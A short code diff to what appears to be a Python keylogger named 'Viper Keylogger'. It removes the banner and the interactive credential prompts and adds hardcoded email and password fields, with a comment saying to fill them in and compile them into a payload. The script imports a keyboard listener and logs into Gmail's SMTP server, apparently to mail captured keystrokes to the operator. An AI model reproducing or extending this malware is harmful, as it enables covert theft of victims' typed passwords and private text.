@@ -1,24 +1,10 @@
-import getpass
 import smtplib
 from pynput.keyboard import Key, Listener
 
-print('''
-___    ______             ________                                             
-__||  / /__(_)_______________  __ \                                            
-__|| / /__  /___  __ \  _ \_  /_/ /                                            
-__||/ / _  / __  /_/ /  __/  _, _/                                             
-__|__/  /_/  _  .___/\___//_/ |_|                                              
-             /_/                                                               
-                 ______ __            ______                          ________ 
-                 ___/ //_/_________  ____  /____________ _______ ________  __ \_
-                 __/ ,<  _  _ \_  / / /_  /_  __ \_  __ `/_  __ `/  _ \_  /_/ /
-                 _/ /| | /  __/  /_/ /_  / / /_/ /  /_/ /_  /_/ //  __/  _, _/ 
-                 /_/ |_| \___/_\__, / /_/  \____/_\__, / _\__, / \___//_/ |_|  
-                              /____/             /____/  /____/                           
-''')
+#Enter these details and compile to create Payload
+email = ""
+password = ""
 
-email = input('Enter Email to send data: ')
-password = getpass.getpass(prompt='Email App password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
